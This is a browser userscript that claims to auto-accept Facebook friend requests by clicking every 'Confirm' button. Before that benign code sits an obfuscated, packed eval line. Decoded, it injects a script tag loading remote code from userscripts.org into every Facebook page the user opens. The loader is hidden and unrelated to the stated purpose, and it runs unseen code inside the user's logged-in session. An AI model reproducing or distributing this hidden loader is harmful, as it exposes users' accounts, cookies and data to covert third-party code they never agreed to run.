// ==UserScript==
// @name           Facebook Auto Confirm Friend Requests Plus
// @namespace      http://blog.mapmyglobe.com/
// @author         Julien C
// @description    Automatically accept all friend requests on Facebook. Please leave some time for all the Ajax calls to run if you've got a lot of requests
// @include        http://*.facebook.com/reqs.php*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



(function() {
  //CSS Selector:
  function $$(xpath,root) { 
    xpath=xpath.replace(/((^|\|)\s*)([^/|\s]+)/g,'$2.//$3').
               replace(/\.([\w-]+)(?!([^\]]*]))/g,'[@class="$1" or @class$=" $1" or @class^="$1 " or @class~=" $1 "]').
                replace(/#([\w-]+)/g,'[@id="$1"]').
                replace(/\/\[/g,'/*[');
    str='(@\\w+|"[^"]*"|\'[^\']*\')'
    xpath=xpath.replace(new RegExp(str+'\\s*~=\\s*'+str,'g'),'contains($1,$2)').
                replace(new RegExp(str+'\\s*\\^=\\s*'+str,'g'),'starts-with($1,$2)').
                replace(new RegExp(str+'\\s*\\$=\\s*'+str,'g'),'substring($1,string-length($1)-string-length($2)+1)=$2');
    var got=document.evaluate(xpath,root||document,null,null,null), result=[];
    while(next=got.iterateNext()) result.push(next);
    return result;
  }
  
  
  var inputbuttons = $$('input.inputbutton');
  for (var i = 0; i < inputbuttons.length; i++){
    if (inputbuttons[i].value=="Confirm"){
      inputbuttons[i].click();
    }
  }
})();